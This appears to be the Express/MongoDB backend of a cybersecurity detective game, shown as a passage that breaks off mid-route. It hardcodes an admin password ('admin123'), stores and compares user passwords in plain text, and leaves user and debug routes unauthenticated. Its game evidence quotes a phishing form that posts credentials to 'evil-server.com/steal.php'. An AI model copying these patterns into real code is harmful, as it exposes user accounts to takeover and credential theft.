// ===== 1. IMPORT PACKAGES =====
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

// ===== 2. CREATE EXPRESS APP =====
const app = express();

// ===== 3. MIDDLEWARE (Settings) =====
app.use(cors({
  origin: ['http://localhost:5173', 'http://localhost:3000'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
}));
app.use(express.json({ limit: '50mb' }));

// ===== 4. CONNECT TO MONGODB =====
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/crimesolver')
    .then(() => {
        console.log('✅ Connected to MongoDB!');
        console.log('📊 Database:', mongoose.connection.name);
    })
    .catch(err => console.error('❌ MongoDB connection error:', err));

// ===== 5. CREATE USER SCHEMA with GAME PROGRESS =====
const userSchema = new mongoose.Schema({
    fullName: { type: String, required: true, trim: true },
    email: { type: String, required: true, unique: true, lowercase: true, trim: true },
    password: { type: String, required: true, minlength: 6 },
    rank: { type: String, default: 'Lead Investigator' },
    bio: { type: String, default: '', maxlength: 150 },
    avatar: { type: String, default: '' },
    createdAt: { type: Date, default: Date.now },
    
    gameProgress: {
        case101: {
            discoveries: { type: [Number], default: [] },
            xp: { type: Number, default: 0 },
            notes: { type: Array, default: [] },
            completed: { type: Boolean, default: false },
            completedAt: { type: Date, default: null },
            accuracy: { type: Number, default: 0 }
        },
        case102: {
            discoveries: { type: [Number], default: [] },
            xp: { type: Number, default: 0 },
            notes: { type: Array, default: [] },
            completed: { type: Boolean, default: false },
            completedAt: { type: Date, default: null },
            accuracy: { type: Number, default: 0 }
        },
        totalXP: { type: Number, default: 0 },
        level: { type: Number, default: 1 }
    }
});

const User = mongoose.model('User', userSchema);

// ===== 6. LEVEL 1 PROGRESS SCHEMA =====
const level1ProgressSchema = new mongoose.Schema({
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    unique: true
  },
  startedAt: {
    type: Date,
    default: Date.now
  },
  status: {
    type: String,
    enum: ['in-progress', 'completed', 'failed'],
    default: 'in-progress'
  },
  discoveries: {
    type: [Number],
    default: []
  },
  xpEarned: {
    type: Number,
    default: 0
  },
  notes: {
    type: Array,
    default: []
  },
  lastAccessed: {
    type: Date,
    default: Date.now
  },
  attempts: {
    type: Number,
    default: 1
  },
  completedAt: {
    type: Date,
    default: null
  },
  accuracy: {
    type: Number,
    default: 0
  }
});

const Level1Progress = mongoose.model('Level1Progress', level1ProgressSchema, 'level1progresses');

// ===== 7. LEVEL 2 PROGRESS SCHEMA =====
const level2ProgressSchema = new mongoose.Schema({
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    unique: true
  },
  startedAt: {
    type: Date,
    default: Date.now
  },
  status: {
    type: String,
    enum: ['in-progress', 'completed', 'failed'],
    default: 'in-progress'
  },
  discoveries: {
    type: [Number],
    default: []
  },
  xpEarned: {
    type: Number,
    default: 0
  },
  notes: {
    type: Array,
    default: []
  },
  lastAccessed: {
    type: Date,
    default: Date.now
  },
  attempts: {
    type: Number,
    default: 1
  },
  completedAt: {
    type: Date,
    default: null
  },
  accuracy: {
    type: Number,
    default: 0
  }
});

const Level2Progress = mongoose.model('Level2Progress', level2ProgressSchema, 'level2progresses');

// ===== 8. TEST ROUTE =====
app.get('/api/test', (req, res) => {
  console.log('✅ Test endpoint hit!');
  res.json({ 
    success: true, 
    message: 'Server is running!',
    timestamp: new Date().toISOString(),
    port: process.env.PORT || 5000
  });
});

// ===== 9. ROOT ROUTE =====
app.get('/', (req, res) => {
    res.send('CrimeSolver Backend is Running! 🕵️');
});

// ===== 10. DEBUG ENDPOINT =====
app.get('/api/debug/collection', async (req, res) => {
  try {
    const collections = await mongoose.connection.db.listCollections().toArray();
    const collectionNames = collections.map(c => c.name);
    
    const level1Count = await Level1Progress.countDocuments();
    const level2Count = await Level2Progress.countDocuments();
    const userCount = await User.countDocuments();
    
    res.json({
      success: true,
      connected: true,
      database: mongoose.connection.name,
      collections: collectionNames,
      stats: {
        users: userCount,
        level1progresses: level1Count,
        level2progresses: level2Count
      },
      message: 'MongoDB connection is working!'
    });
  } catch (error) {
    console.error('❌ Debug endpoint error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message,
      message: 'Error connecting to MongoDB'
    });
  }
});

// ===== 11. REGISTER ROUTE =====
app.post('/api/register', async (req, res) => {
    try {
        const { fullName, email, password } = req.body;

        if (email === 'admin@crimesolver.com') {
            return res.status(400).json({ message: 'This email is reserved for admin' });
        }

        const existingUser = await User.findOne({ email });
        if (existingUser) {
            return res.status(400).json({ message: 'Email already registered' });
        }

        const joinDate = new Date().toLocaleDateString('en-US', { 
            month: 'long', day: 'numeric', year: 'numeric' 
        });
        const defaultBio = `Passionate detective solving mysteries and uncovering truth. Member since ${joinDate}.`;

        const user = new User({ 
            fullName, email, password,
            bio: defaultBio,
            gameProgress: {
                case101: { discoveries: [], xp: 0, notes: [], completed: false, completedAt: null, accuracy: 0 },
                case102: { discoveries: [], xp: 0, notes: [], completed: false, completedAt: null, accuracy: 0 },
                totalXP: 0,
                level: 1
            }
        });
        
        await user.save();
        res.status(201).json({ 
            message: 'Registration successful!',
            user: { 
                _id: user._id, 
                fullName: user.fullName, 
                email: user.email, 
                rank: user.rank, 
                bio: user.bio, 
                avatar: user.avatar, 
                createdAt: user.createdAt, 
                gameProgress: user.gameProgress 
            }
        });

    } catch (error) {
        console.error('❌ Error saving user:', error);
        res.status(500).json({ message: 'Registration failed' });
    }
});

// ===== 12. LOGIN ROUTE =====
app.post('/api/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        const ADMIN_EMAIL = 'admin@crimesolver.com';
        const ADMIN_PASSWORD = 'admin123';

        if (email === ADMIN_EMAIL) {
            if (password === ADMIN_PASSWORD) {
                return res.json({ 
                    message: 'Login successful!',
                    user: { 
                        _id: 'admin', 
                        fullName: 'Administrator', 
                        email: ADMIN_EMAIL, 
                        role: 'admin', 
                        gameProgress: { 
                            case101: { discoveries: [], xp: 0, notes: [], completed: false },
                            case102: { discoveries: [], xp: 0, notes: [], completed: false },
                            totalXP: 0, 
                            level: 1 
                        } 
                    }
                });
            } else {
                return res.status(401).json({ message: 'Incorrect admin password' });
            }
        }

        const user = await User.findOne({ email });
        
        if (!user) return res.status(401).json({ message: 'Email not found' });
        if (user.password !== password) return res.status(401).json({ message: 'Incorrect password' });

        res.json({ 
            message: 'Login successful!',
            user: { 
                _id: user._id, 
                fullName: user.fullName, 
                email: user.email, 
                rank: user.rank, 
                bio: user.bio, 
                avatar: user.avatar, 
                createdAt: user.createdAt, 
                role: 'user', 
                gameProgress: user.gameProgress 
            }
        });

    } catch (error) {
        console.error('❌ Login error:', error);
        res.status(500).json({ message: 'Login failed' });
    }
});

// ===== 13. VERIFY PASSWORD ROUTE =====
app.post('/api/verify-password', async (req, res) => {
    try {
        const { userId, password } = req.body;
        
        if (userId === 'admin') {
            return res.json({ verified: password === 'admin123' });
        }

        if (!mongoose.Types.ObjectId.isValid(userId)) {
            return res.status(400).json({ verified: false, message: 'Invalid user ID' });
        }

        const user = await User.findById(userId);
        if (!user) return res.status(404).json({ verified: false, message: 'User not found' });

        res.json({ verified: user.password === password });

    } catch (error) {
        console.error('❌ Verification error:', error);
        res.status(500).json({ verified: false, message: 'Verification failed' });
    }
});

// ===== 14. LEVEL 1 START =====
app.post('/api/level1progresses/start', async (req, res) => {
  try {
    const { userId } = req.body;
    
    console.log(`🎮 /api/level1progresses/start called for user: ${userId}`);

    if (userId === 'admin') {
      return res.json({ message: 'Admin level start (no progress saved)', progress: null });
    }

    if (!mongoose.Types.ObjectId.isValid(userId)) {
      return res.status(400).json({ message: 'Invalid user ID' });
    }

    const progress = await Level1Progress.findOneAndUpdate(
      { userId },
      {
        $set: { lastAccessed: new Date() },
        $inc: { attempts: 1 }
      },
      { 
        returnDocument: 'after',
        upsert: true,
        setDefaultsOnInsert: true
      }
    );

    console.log(`✅ Progress updated - Notes: ${progress.notes.length}, Discoveries: ${progress.discoveries.length}, XP: ${progress.xpEarned}, Attempts: ${progress.attempts}`);

    res.json({
      message: 'Level 1 progress updated',
      progress: {
        startedAt: progress.startedAt,
        status: progress.status,
        discoveries: progress.discoveries,
        xpEarned: progress.xpEarned,
        notes: progress.notes,
        attempts: progress.attempts
      }
    });

  } catch (error) {
    console.error('❌ Error updating level progress:', error);
    res.status(500).json({ message: error.message });
  }
});

// ===== 15. LEVEL 2 START =====
app.post('/api/level2progresses/start', async (req, res) => {
  try {
    const { userId } = req.body;
    
    console.log(`🎮 /api/level2progresses/start called for user: ${userId}`);

    if (userId === 'admin') {
      return res.json({ message: 'Admin level start (no progress saved)', progress: null });
    }

    if (!mongoose.Types.ObjectId.isValid(userId)) {
      return res.status(400).json({ message: 'Invalid user ID' });
    }

    const progress = await Level2Progress.findOneAndUpdate(
      { userId },
      {
        $set: { lastAccessed: new Date() },
        $inc: { attempts: 1 }
      },
      { 
        returnDocument: 'after',
        upsert: true,
        setDefaultsOnInsert: true
      }
    );

    console.log(`✅ Level 2 progress updated - Notes: ${progress.notes.length}, Discoveries: ${progress.discoveries.length}, XP: ${progress.xpEarned}`);

    res.json({
      message: 'Level 2 progress updated',
      progress: {
        startedAt: progress.startedAt,
        status: progress.status,
        discoveries: progress.discoveries,
        xpEarned: progress.xpEarned,
        notes: progress.notes,
        attempts: progress.attempts
      }
    });

  } catch (error) {
    console.error('❌ Error updating level progress:', error);
    res.status(500).json({ message: error.message });
  }
});

// ===== 16. GET LEVEL 1 PROGRESS =====
app.get('/api/level1progresses/progress/:userId', async (req, res) => {
  try {
    const { userId } = req.params;

    if (userId === 'admin') {
      return res.json({ progress: null, message: 'Admin has no progress' });
    }

    const progress = await Level1Progress.findOne({ userId });
    
    if (!progress) {
      return res.json({ progress: null, message: 'No progress found' });
    }

    res.json({ progress });

  } catch (error) {
    console.error('❌ Error fetching level progress:', error);
    res.status(500).json({ message: error.message });
  }
});

// ===== 17. GET LEVEL 2 PROGRESS =====
app.get('/api/level2progresses/progress/:userId', async (req, res) => {
  try {
    const { userId } = req.params;

    if (userId === 'admin') {
      return res.json({ progress: null, message: 'Admin has no progress' });
    }

    const progress = await Level2Progress.findOne({ userId });
    
    if (!progress) {
      return res.json({ progress: null, message: 'No progress found' });
    }

    res.json({ progress });

  } catch (error) {
    console.error('❌ Error fetching level progress:', error);
    res.status(500).json({ message: error.message });
  }
});

// ===== 18. GET ALL USERS =====
app.get('/api/users', async (req, res) => {
    try {
        const users = await User.find().select('-password');
        res.json(users);
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// ===== 19. GET SINGLE USER BY ID =====
app.get('/api/users/:id', async (req, res) => {
    try {
        const user = await User.findById(req.params.id).select('-password');
        if (!user) return res.status(404).json({ message: 'User not found' });
        res.json(user);
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// ===== 20. UPDATE USER =====
app.put('/api/users/:id', async (req, res) => {
    try {
        const { rank, bio, avatar, casesSolved, successRate, gameProgress } = req.body;
        
        const updateData = {};
        if (rank !== undefined) updateData.rank = rank;
        if (bio !== undefined) updateData.bio = bio;
        if (avatar !== undefined) updateData.avatar = avatar;
        if (casesSolved !== undefined) updateData.casesSolved = casesSolved;
        if (successRate !== undefined) updateData.successRate = successRate;
        if (gameProgress !== undefined) updateData.gameProgress = gameProgress;

        const user = await User.findByIdAndUpdate(
            req.params.id, updateData, { new: true, runValidators: true }
        ).select('-password');
        
        if (!user) return res.status(404).json({ message: 'User not found' });
        
        res.json({ message: 'Profile updated successfully', user });

    } catch (error) {
        console.error('❌ Error updating user:', error);
        res.status(500).json({ message: error.message });
    }
});

// ===== 21. DELETE USER =====
app.delete('/api/users/:id', async (req, res) => {
    try {
        const user = await User.findByIdAndDelete(req.params.id);
        if (!user) return res.status(404).json({ message: 'User not found' });
        
        await Level1Progress.deleteMany({ userId: req.params.id });
        await Level2Progress.deleteMany({ userId: req.params.id });
        res.json({ message: 'User deleted successfully' });
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

// ===== 22. GET CASE NOTES - LEVEL 1 =====
app.get('/api/level1progresses/notes/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    console.log(`📓 Fetching notes for user: ${userId}`);

    if (userId === 'admin') {
      return res.json({ 
        xpEarned: 0, 
        notes: [], 
        discoveries: [], 
        status: 'in-progress', 
        message: "Player currently not find anything" 
      });
    }

    if (!mongoose.Types.ObjectId.isValid(userId)) {
      return res.status(400).json({ message: 'Invalid user ID' });
    }

    const progress = await Level1Progress.findOne({ userId });

    if (!progress) {
      return res.json({ 
        xpEarned: 0, 
        notes: [], 
        discoveries: [], 
        status: 'in-progress', 
        message: "Player currently not find anything" 
      });
    }

    const discoveries = progress.discoveries || [];
    const correctXP = discoveries.length * 15;
    
    if (progress.xpEarned !== correctXP) {
      console.log(`⚠️ Fixing XP for user ${userId}: ${progress.xpEarned} → ${correctXP}`);
      progress.xpEarned = correctXP;
      await progress.save();
    }

    res.json({
      xpEarned: progress.xpEarned,
      notes: progress.notes || [],
      discoveries: discoveries,
      status: progress.status || 'in-progress',
      message: progress.notes && progress.notes.length > 0 ? "Player has found evidence" : "Player currently not find anything"
    });

  } catch (error) {
    console.error('❌ Error fetching case notes:', error);
    res.status(500).json({ 
      xpEarned: 0, 
      notes: [], 
      discoveries: [], 
      status: 'in-progress', 
      message: "Player currently not find anything" 
    });
  }
});

// ===== 23. GET CASE NOTES FOR LEVEL 2 =====
app.get('/api/level2progresses/notes/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    console.log(`📓 Fetching level2 notes for user: ${userId}`);

    if (userId === 'admin') {
      return res.json({ 
        xpEarned: 0, 
        notes: [], 
        discoveries: [], 
        status: 'in-progress', 
        message: "Player currently not find anything" 
      });
    }

    if (!mongoose.Types.ObjectId.isValid(userId)) {
      return res.status(400).json({ message: 'Invalid user ID' });
    }

    const progress = await Level2Progress.findOne({ userId });

    if (!progress) {
      return res.json({ 
        xpEarned: 0, 
        notes: [], 
        discoveries: [], 
        status: 'in-progress', 
        message: "Player currently not find anything" 
      });
    }

    const discoveries = progress.discoveries || [];
    const correctXP = discoveries.length * 15;

    if (progress.xpEarned !== correctXP) {
      console.log(`⚠️ Fixing XP for user ${userId} level2: ${progress.xpEarned} → ${correctXP}`);
      progress.xpEarned = correctXP;
      await progress.save();
    }

    res.json({
      xpEarned: progress.xpEarned,
      notes: progress.notes || [],
      discoveries: discoveries,
      status: progress.status || 'in-progress',
      message: progress.notes && progress.notes.length > 0 ? "Player has found evidence" : "Player currently not find anything"
    });

  } catch (error) {
    console.error('❌ Error fetching case notes:', error);
    res.status(500).json({ 
      xpEarned: 0, 
      notes: [], 
      discoveries: [], 
      status: 'in-progress', 
      message: "Player currently not find anything" 
    });
  }
});

// ===== 24. GET EVIDENCE FOR LEVEL 1 =====
app.get('/api/evidence/level1', async (req, res) => {
  try {
    const evidence = {
      level: "level1",
      notes: {
        note1: { 
          id: 1, 
          type: "discovery", 
          title: "DISCOVERY: 3:00 AM Suspicious Login", 
          timestamp: "2024-03-16 15:30:22", 
          content: "DISCOVERY: 3:00 AM Suspicious Login\n\nSUSPICIOUS LOG ENTRY:\n2024-03-16 03:00:47 LOGIN_SUCCESS jdoe 10.12.45.89\n\nThis is the unauthorized login at 3 AM.\nJohn's normal IP is 10.0.0.45 - this is DIFFERENT.\n\n[🔗 Evidence: auth.log - line 42]\n[+15 XP]", 
          source: "auth.log" 
        },
        note2: { 
          id: 2, 
          type: "discovery", 
          title: "DISCOVERY: Attack Pattern Detected", 
          timestamp: "2024-03-16 15:32:15", 
          content: "DISCOVERY: Attack Pattern Detected\n\nSUSPICIOUS PATTERN FOUND:\n02:58:12 LOGIN_FAILED jdoe 10.12.45.89\n02:59:03 LOGIN_FAILED jdoe 10.12.45.89\n03:00:47 LOGIN_SUCCESS jdoe 10.12.45.89\n\nTwo failed attempts followed by success at\nexactly 6-second intervals. This is an AUTOMATED\nbrute-force attack, not a mistyped password.\n\n[🔗 Evidence: auth.log - lines 39-41]\n[+15 XP]", 
          source: "auth.log" 
        },
        note3: { 
          id: 3, 
          type: "discovery", 
          title: "DISCOVERY: John Was OFF Work", 
          timestamp: "2024-03-16 15:35:47", 
          content: "DISCOVERY: John Was OFF Work\n\nChecked employee schedule:\nusername,date,shift\njdoe,2024-03-15,DAY\njdoe,2024-03-16,OFF  ← ⭐ VERIFIED\n\nJohn was NOT scheduled to work on March 16.\nHe was home asleep like his wife said.\nHis alibi CHECKS OUT.\n\n[🔗 Evidence: employees/shifts.csv - line 5]\n[+15 XP]", 
          source: "shifts.csv" 
        },
        note4: { 
          id: 4, 
          type: "discovery", 
          title: "DISCOVERY: Unauthorized HR Access", 
          timestamp: "2024-03-16 15:40:13", 
          content: "DISCOVERY: Unauthorized HR Access\n\nUSER ACCESS LEVELS:\n-------------------\njdoe (Marketing): HR_READ, SALES_READ, MARKETING_WRITE\nsmith (Sales): SALES_READ, SALES_WRITE\npark (IT): ADMIN, LOGS_READ, DATABASE_WRITE\n\nNOTE: Marketing managers should NOT have HR access.\nThis explains WHY the attacker targeted John!\nHe had access to salary data.\n\n[🔗 Evidence: system_info/permissions.txt]\n[+15 XP]", 
          source: "permissions.txt" 
        },
        note5: { 
          id: 5, 
          type: "discovery", 
          title: "DISCOVERY: Suspicious IP Identified", 
          timestamp: "2024-03-16 15:45:22", 
          content: "DISCOVERY: Suspicious IP Identified\n\nAll activity from IP 10.12.45.89 in auth.log:\n\n2024-03-16 02:58:12 LOGIN_FAILED    jdoe 10.12.45.89\n2024-03-16 02:59:03 LOGIN_FAILED    jdoe 10.12.45.89\n2024-03-16 03:00:47 LOGIN_SUCCESS   jdoe 10.12.45.89\n2024-03-16 03:15:22 QUERY_EXEC      jdoe hr_database\n2024-03-16 03:16:45 LOGOUT          jdoe 10.12.45.89\n\nFound 5 matches\n\nThis IP was ONLY active at 3 AM.\nNever during normal work hours.\n\n[🔗 Evidence: auth.log (grep results)]\n[+15 XP]", 
          source: "auth.log (grep)" 
        },
        note6: { 
          id: 6, 
          type: "conclusion", 
          title: "FINAL CONCLUSION - Case #101", 
          timestamp: "2024-03-16 16:00:22", 
          content: "═══════════════════════════════════════════════════════\n                    FINAL CONCLUSION\n═══════════════════════════════════════════════════════\n\nBased on all evidence:\n\n1. John's account was used at 3:00 AM from 10.12.45.89\n   (different from his normal IP 10.0.0.45)\n\n2. There were 2 failed attempts before success\n   at exactly 6-second intervals - AUTOMATED brute-force\n   attack, not a mistaken password!\n\n3. John was OFF work on March 16 - he wasn't there\n   (verified in shifts.csv)\n\n4. John has HR access (shouldn't for his role)\n   - explains WHY attacker targeted him specifically\n   - He had access to salary data\n\n5. IP 10.12.45.89 was ONLY active at 3 AM\n   Never used during normal business hours\n\n═══════════════════════════════════════════════════════\n\nCONCLUSION:\nJohn's account was COMPROMISED by an automated\nbrute-force attack. John is the VICTIM, not the perpetrator.\n\nRECOMMENDATIONS:\n• Reset John's password immediately (was \"Summer2023\")\n• Enable two-factor authentication\n• Remove John's HR access (he shouldn't have it)\n• Block IP 10.12.45.89 at firewall\n• Review all Marketing accounts for similar issues\n\n═══════════════════════════════════════════════════════\n[🔗 Evidence: auth.log, shifts.csv, permissions.txt]\n[Total XP: 75]", 
          source: "Manual Entry" 
        }
      }
    };
    
    res.json(evidence);
    
  } catch (error) {
    console.error('❌ Error fetching evidence:', error);
    res.status(500).json({ message: error.message });
  }
});

// ===== 25. GET EVIDENCE FOR LEVEL 2 =====
app.get('/api/evidence/level2', async (req, res) => {
  try {
    const evidence = {
      level: "level2",
      notes: {
        note1: { 
          id: 1, 
          type: "discovery", 
          title: "DISCOVERY: Phishing Email Found", 
          timestamp: "2024-03-20 15:30:22", 
          content: "DISCOVERY: Phishing Email Found\n\nSUSPICIOUS EMAIL:\n14:32:04 DELIVERED FROM: IT-Support@company-reset.com TO: sarah, mike, lisa, 12 more\n\nThis is the phishing email sent to 15 employees.\nDomain company-reset.com is NOT our company domain!\n\n[🔗 Evidence: smtp.log]\n[+15 XP]", 
          source: "smtp.log" 
        },
        note2: { 
          id: 2, 
          type: "discovery", 
          title: "DISCOVERY: Victims Identified", 
          timestamp: "2024-03-20 15:32:15", 
          content: "DISCOVERY: Victims Identified\n\nVICTIMS CLICKED THE LINK:\n14:35 sarah company-reset.com/login\n14:36 mike company-reset.com/login\n14:38 lisa company-reset.com/login\n14:40-14:45 /submit entries\n\nThree employees fell for the phishing email and entered their credentials!\n\n[🔗 Evidence: proxy.log]\n[+15 XP]", 
          source: "proxy.log" 
        },
        note3: { 
          id: 3, 
          type: "discovery", 
          title: "DISCOVERY: Phishing Page Analyzed", 
          timestamp: "2024-03-20 15:35:47", 
          content: "DISCOVERY: Phishing Page Analyzed\n\nPHISHING PAGE CODE:\n<form action=\"http://evil-server.com/steal.php\" method=\"POST\">\n\nThe fake login page submits credentials to evil-server.com!\n\n[🔗 Evidence: phishing_page.html]\n[+15 XP]", 
          source: "phishing_page.html" 
        },
        note4: { 
          id: 4, 
          type: "discovery", 
          title: "DISCOVERY: Malicious Server Located", 
          timestamp: "2024-03-20 15:40:13", 
          content: "DISCOVERY: Malicious Server Located\n\nNSLOOKUP RESULTS:\nIP: 185.142.53.89\nLocation: Russia\nISP: Malicious Hosting Ltd\n\nevil-server.com is hosted in Russia!\n\n[🔗 Evidence: nslookup]\n[+15 XP]", 
          source: "nslookup" 
        },
        note5: { 
          id: 5, 
          type: "discovery", 
          title: "DISCOVERY: Stolen Credentials Found", 
          timestamp: "2024-03-20 15:45:22", 
          content: "DISCOVERY: Stolen Credentials Found\n\nCAPTURED PASSWORDS:\nsarah:Summer2024!\nmike:sales123\nlisa:finance2024\n\nThe attacker captured all three victims' passwords!\n\n[🔗 Evidence: credentials.txt]\n[+15 XP]", 
          source: "credentials.txt" 
        },
        note6: { 
          id: 6, 
          type: "discovery", 
          title: "DISCOVERY: 2FA Saved the Day", 
          timestamp: "2024-03-20 15:48:22", 
          content: "DISCOVERY: 2FA Saved the Day\n\nATTACKER ATTEMPTS:\n23:15 VPN_ATTEMPT sarah 185.142.53.89\n23:16 VPN_FAILED sarah 185.142.53.89\n23:18 VPN_ATTEMPT lisa 185.142.53.89\n23:19 VPN_FAILED lisa 185.142.53.89\n\nAttacker tried to use stolen credentials at 11:15 PM\nbut was BLOCKED by 2FA! All attempts FAILED!\n\n[🔗 Evidence: firewall.log]\n[+15 XP]", 
          source: "firewall.log" 
        }
      }
    };
    
    res.json(evidence);
    
  } catch (error) {
    console.error('❌ Error fetching evidence:', error);
    res.status(500).json({ message: error.message });
  }
});

// ===== 26. ADD NOTE - LEVEL 1 (FIXED) =====
app.post('/api/level1progresses/add-note', async (req, res) => {
  console.log('\n🔴🔴🔴🔴🔴 ADD NOTE REQUEST RECEIVED 🔴🔴🔴🔴🔴');
  console.log('Request body:', JSON.stringify(req.body, null, 2));
  
  try {
    const { userId, note, xpEarned, discoveryId } = req.body;

    // Validate inputs
    if (!userId || userId === 'admin') {
      return res.status(400).json({ success: false, message: 'Invalid user' });
    }

    if (!note) {
      return res.status(400).json({ success: false, message: 'No note provided' });
    }

    if (!mongoose.Types.ObjectId.isValid(userId)) {
      return res.status(400).json({ success: false, message: 'Invalid user ID format' });
    }

    // Check if user exists
    const userExists = await User.findById(userId);
    if (!userExists) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }

    // Prepare the note for MongoDB - USE xpEarned FROM REQUEST
    const preparedNote = {
      id: note.id || Date.now(),
      noteId: note.noteId || note.id || Date.now(),
      timestamp: note.timestamp || new Date().toLocaleString(),
      title: note.title || 'Note',
      content: note.content || '',
      source: note.source || 'Log Viewer',
      xp: xpEarned || 0,  // ✅ Use xpEarned from request, NOT from note
      isConclusion: note.isConclusion || false,
      caseId: note.caseId || '101',
      createdAt: note.createdAt || new Date().toISOString(),
      type: note.type || 'note'
    };

    console.log('📝 Prepared note for MongoDB:', preparedNote);

    // Find the progress document
    let progress = await Level1Progress.findOne({ userId });

    if (!progress) {
      // Create new progress document if it doesn't exist
      progress = new Level1Progress({
        userId,
        startedAt: new Date(),
        status: 'in-progress',
        discoveries: discoveryId ? [discoveryId] : [],
        xpEarned: xpEarned || 0,
        notes: [preparedNote],
        lastAccessed: new Date(),
        attempts: 1,
        completedAt: null,
        accuracy: 0
      });
    } else {
      // Update existing document
      progress.notes.push(preparedNote);
      
      // Only add discovery and XP if it's a new discovery
      if (discoveryId && !progress.discoveries.includes(discoveryId)) {
        progress.discoveries.push(discoveryId);
        progress.xpEarned = (progress.xpEarned || 0) + (xpEarned || 0);
      }
      
      progress.lastAccessed = new Date();
    }

    // Ensure XP is correct based on unique discoveries
    const uniqueDiscoveries = progress.discoveries || [];
    const correctXP = uniqueDiscoveries.length * 15;
    
    if (progress.xpEarned !== correctXP) {
      console.log(`⚠️ Adjusting XP from ${progress.xpEarned} to ${correctXP}`);
      progress.xpEarned = correctXP;
    }

    // Save to database
    await progress.save();

    console.log('✅✅✅ NOTE SAVED SUCCESSFULLY! ✅✅✅');
    console.log(`📊 Final state - Notes: ${progress.notes.length}, Discoveries: ${progress.discoveries}, XP: ${progress.xpEarned}`);

    res.json({
      success: true,
      discoveries: progress.discoveries,
      xpEarned: progress.xpEarned,
      notes: progress.notes,
      message: "Note saved successfully"
    });

  } catch (error) {
    console.error('❌❌❌ ERROR in add-note:', error);
    res.status(500).json({ 
      success: false,
      message: error.message,
      error: error.toString()
    });
  }
});

// ===== 27. ADD NOTE FOR LEVEL 2 (FIXED) =====
app.post('/api/level2progresses/add-note', async (req, res) => {
  console.log('\n🔵🔵🔵🔵🔵 ADD NOTE LEVEL 2 REQUEST RECEIVED 🔵🔵🔵🔵🔵');
  console.log('Request body:', JSON.stringify(req.body, null, 2));
  
  try {
    const { userId, note, xpEarned, discoveryId } = req.body;

    if (!userId || userId === 'admin') {
      return res.status(400).json({ success: false, message: 'Invalid user' });
    }

    if (!note) {
      return res.status(400).json({ success: false, message: 'No note provided' });
    }

    if (!mongoose.Types.ObjectId.isValid(userId)) {
      return res.status(400).json({ success: false, message: 'Invalid user ID' });
    }

    const userExists = await User.findById(userId);
    if (!userExists) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }

    // Prepare the note for MongoDB - USE xpEarned FROM REQUEST
    const preparedNote = {
      id: note.id || Date.now(),
      noteId: note.noteId || note.id || Date.now(),
      timestamp: note.timestamp || new Date().toLocaleString(),
      title: note.title || 'Note',
      content: note.content || '',
      source: note.source || 'Log Viewer',
      xp: xpEarned || 0,  // ✅ Use xpEarned from request
      isConclusion: note.isConclusion || false,
      caseId: note.caseId || '102',
      createdAt: note.createdAt || new Date().toISOString(),
      type: note.type || 'note'
    };

    let progress = await Level2Progress.findOne({ userId });

    if (!progress) {
      progress = new Level2Progress({
        userId,
        startedAt: new Date(),
        status: 'in-progress',
        discoveries: discoveryId ? [discoveryId] : [],
        xpEarned: xpEarned || 0,
        notes: [preparedNote],
        lastAccessed: new Date(),
        attempts: 1,
        completedAt: null,
        accuracy: 0
      });
    } else {
      progress.notes.push(preparedNote);
      
      if (discoveryId && !progress.discoveries.includes(discoveryId)) {
        progress.discoveries.push(discoveryId);
        progress.xpEarned = (progress.xpEarned || 0) + (xpEarned || 0);
      }
      
      progress.lastAccessed = new Date();
    }

    const uniqueDiscoveries = progress.discoveries || [];
    const correctXP = uniqueDiscoveries.length * 15;
    
    if (progress.xpEarned !== correctXP) {
      console.log(`⚠️ Adjusting XP from ${progress.xpEarned} to ${correctXP}`);
      progress.xpEarned = correctXP;
    }

    await progress.save();

    console.log('✅✅✅ NOTE SAVED SUCCESSFULLY! ✅✅✅');
    console.log(`📊 Final state - Notes: ${progress.notes.length}, Discoveries: ${progress.discoveries}, XP: ${progress.xpEarned}`);

    res.json({
      success: true,
      discoveries: progress.discoveries,
      xpEarned: progress.xpEarned,
      notes: progress.notes,
      message: "Note saved successfully"
    });

  } catch (error) {
    console.error('❌ ERROR in add-note:', error);
    res.status(500).json({ 
      success: false,
      message: error.message
    });
  }
});

// ===== 28. DELETE NOTE - LEVEL 1 =====
app.post('/api/level1progresses/delete-note', async (req, res) => {
  try {
    const { userId, noteId, discoveryId, xpLost } = req.body;

    if (userId === 'admin') {
      return res.json({ message: 'Admin note not deleted' });
    }

    if (!mongoose.Types.ObjectId.isValid(userId)) {
      return res.status(400).json({ message: 'Invalid user ID' });
    }

    console.log(`🗑️ Deleting note ${noteId} for user ${userId}, discovery: ${discoveryId}, xpLost: ${xpLost}`);

    let progress = await Level1Progress.findOne({ userId });
    
    if (!progress) {
      return res.status(404).json({ message: 'Progress not found' });
    }

    const updatedNotes = progress.notes.filter(n => n.id !== noteId);
    
    let updatedDiscoveries = [...progress.discoveries];
    let updatedXP = progress.xpEarned;

    if (discoveryId) {
      const otherNotesWithSameDiscovery = updatedNotes.some(n => 
        n.title && n.title.includes('DISCOVERY:') && 
        n.title.includes(discoveryId.toString())
      );
      
      if (!otherNotesWithSameDiscovery) {
        updatedDiscoveries = updatedDiscoveries.filter(id => id !== discoveryId);
        updatedXP = Math.max(0, updatedXP - (xpLost || 0));
      }
    }

    progress.notes = updatedNotes;
    progress.discoveries = updatedDiscoveries;
    progress.xpEarned = updatedXP;
    progress.lastAccessed = new Date();
    
    await progress.save();

    console.log(`✅ Note deleted. New state - Notes: ${progress.notes.length}, Discoveries: ${progress.discoveries.length}, XP: ${progress.xpEarned}`);

    res.json({
      success: true,
      discoveries: progress.discoveries,
      xpEarned: progress.xpEarned,
      notes: progress.notes,
      message: "Note deleted successfully"
    });

  } catch (error) {
    console.error('❌ Error deleting note:', error);
